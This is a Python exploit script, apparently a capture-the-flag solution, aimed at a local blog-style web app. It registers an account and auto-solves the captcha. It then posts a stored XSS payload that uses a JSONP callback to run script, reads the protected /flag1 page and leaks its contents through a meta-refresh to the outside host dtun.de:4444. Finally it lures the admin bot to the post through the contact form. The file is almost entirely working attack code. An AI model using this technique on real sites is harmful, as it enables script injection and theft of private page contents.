import random, string, re, urllib, requests, sys

URL='http://localhost:1342'
if len(sys.argv) > 1:
    URL=sys.argv[1]

def randstr(n):
    return ''.join(random.choice(string.ascii_letters) for _ in range(n))

def solve_captcha(body):
    captcha = body.split('What is ')[1].split('?')[0].replace(' ','')
    assert all(c in '0123456789+-' for c in captcha)
    return eval(captcha)

def contact(postid):
    r=s.get(URL + '/contact')
    r=s.post(URL + '/contact', data={'postid':postid,
        'csrfmiddlewaretoken': s.cookies['csrftoken'],
        'captcha_answer': solve_captcha(r.text)})

def register(user, pw):
    s.post(URL + '/signup/', data={
        'username': user,
        'password1': pw,
        'password2': pw,
        'csrfmiddlewaretoken': s.cookies['csrftoken'],
        })

def publish(content):
    print 'Post size = %d bytes' % len(content)
    r=s.get(URL+'/')
    r=s.post(URL+'/publish', data={
        'title': 'hi',
        'post': content,
        'csrfmiddlewaretoken': s.cookies['csrftoken'],
        'captcha_answer': solve_captcha(r.text),
        })

def getposts():
    return re.findall(r'/post/([0-9a-f-]{36})', s.get(URL+'/').text)

def script(cb):
    return '<script src="/feed?type=jsonp&cb=%s"></script>' % urllib.quote(cb)

s=requests.Session()
s.get(URL+'/')
tok = s.cookies['csrftoken']
print 'CSRF Token %s'%tok

user = randstr(10)
pw = randstr(10)
print 'user = %s' % user
print 'pw = %s' % pw

register(user, pw)

if __name__ == '__main__':
    call1 = script('shit.append`${woot.import.getElementsByTagName`p`.item``.textContent.trim``}`')
    call2 = script('shit.append`${rest.textContent}`')
    call3 = script('document.write`${shit.textContent}`')

    publish(r'''
    <link id="woot" rel="import" href="/flag1">

    <textarea id="shit">
    <meta http-equiv="refresh" content="0;URL='http://dtun.de:4444/</textarea>

    <textarea id="rest">'"></textarea>

    {call1}
    {call2}
    {call3}
    '''.format(
        call1=call1,
        call2=call2,
        call3=call3))

    payloadpost = getposts()[0]
    print 'http://localhost:1342/post/%s'%payloadpost

    contact(payloadpost)
